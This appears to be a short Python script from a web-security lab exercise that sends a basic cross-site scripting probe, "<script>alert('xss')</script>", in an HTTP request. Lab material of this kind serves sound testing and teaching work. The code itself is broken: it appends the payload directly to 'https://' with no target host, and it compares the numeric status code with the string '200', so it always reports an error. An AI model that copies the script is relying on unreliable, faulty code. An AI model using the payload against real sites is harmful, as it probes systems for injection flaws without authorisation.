import requests

payload = "<script>alert('xss')</script>"

#Change url defined by the lab
url = 'https://' + payload

response = requests.get(url)

print(response.status_code)

if response.status_code != '200':
    print("Error")
else:
    print(response.content)